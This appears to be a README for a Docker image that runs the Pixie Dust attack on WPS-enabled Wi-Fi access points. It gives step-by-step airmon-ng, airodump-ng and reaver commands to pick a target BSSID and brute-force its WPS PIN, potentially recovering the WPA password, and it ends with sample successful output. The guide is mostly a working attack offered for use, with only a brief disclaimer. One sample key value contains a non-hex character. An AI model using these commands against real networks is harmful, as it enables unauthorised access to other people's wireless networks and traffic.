# WiFi Hacking with Pixie Dust Attack (WPS)

Use this for good and not evil. It will only work on wireless access points that are configured with `Wi-Fi Protected Setup`.

## Build and Run

This image should come out to be around `30MB`.

```sh
docker build -t stevenaldinger/wifi-hack-pixie-dust-attack:latest .
```

Run privileged and with `--net=host` so your host machines wireless interfaces are available inside the container.

```sh
docker run --rm -it --privileged --net=host stevenaldinger/wifi-hack-pixie-dust-attack:latest sh
```

# General Process

First find your wireless interface name and set it to monitoring mode with [airmon-ng](https://tools.kali.org/wireless-attacks/airmon-ng). Then start [airodump-ng](https://tools.kali.org/wireless-attacks/airodump-ng) and find the [BSSID](http://www.technology-training.co.uk/bssid.php) of the access point you want to attack.

```sh
# get wireless interface
wireless_interface="$(airmon-ng | grep phy0 | awk '{print $2}')"

# start airmon-ng on the wireless interface
# this changes the interface name
airmon-ng start "$wireless_interface"

# get new wireless interface name
wireless_interface="$(airmon-ng | grep phy0 | awk '{print $2}')"

# start airodump-ng on the wireless interface
# need to get BSSID from this for the AP you're trying to crack (or all of them and iterate)
airodump-ng "$wireless_interface"
```
At this point you'll see something similar to this in your terminal:

```
> BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
>
> A3:2C:9B:C2:23:53  -78       32        1    0   1  130  WPA2 CCMP   PSK  NETGEARxxx      
> DB:DF:03:AD:9B:05  -85       15        0    0  10  270  WPA2 CCMP   PSK  NETGEARxxx_2GEXT
```

Find the `BSSID` that identifies the access point you want to attack, and run:

```sh
# example: bssid_to_attack="DB:DF:03:AD:9B:05"
bssid_to_attack="<YOUR BSSID GOES HERE>"

# run reaver to brute force the WPS pin (and potentially WPA password if mode = 3)
reaver -i "$wireless_interface" -b $bssid_to_attack -vv -K 1 -N
```
# Output

If successful, the output will look something like this:

```
# reaver -i "$wireless_interface" -b $bssid_to_attack -vv -K 1 -N

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from DB:DF:03:AD:9B:05
[+] Switching wlp1s0mon to channel 1
...
[+] Switching wlp1s0mon to channel 8
[+] Switching wlp1s0mon to channel 10
[+] Received beacon from DB:DF:03:AD:9B:05
[+] Vendor: RalinkTe
[+] Trying pin "12345670"
[+] Sending authentication request
[+] Sending association request
[+] Associated with DB:DF:03:AD:9B:05 (ESSID: NETGEARxx_2GEXT)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received identity request
...
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M1 message
...
[+] Received M1 message
executing pixiewps -e eab77...af92 -s 22ac...7372 -z a3f7...2a6d -a 1c06...ca1a -n 7564...de1a -r 349c...edd1

 Pixiewps 1.4

 [?] Mode:     1 (RT/MT/CL)
 [*] Seed N1:  0x7936402a
 [*] Seed ES1: 0x00000000
 [*] Seed ES2: 0x00000000
 [*] PSK1:     d0f2318df9619dd86ee7371d27dcgf16
 [*] PSK2:     834de146498345e034cf233eab6786ab
 [*] ES1:      00000000000000000000000000000000
 [*] ES2:      00000000000000000000000000000000
 [+] WPS pin:  43452301

 [*] Time taken: 0 s 43 ms
```
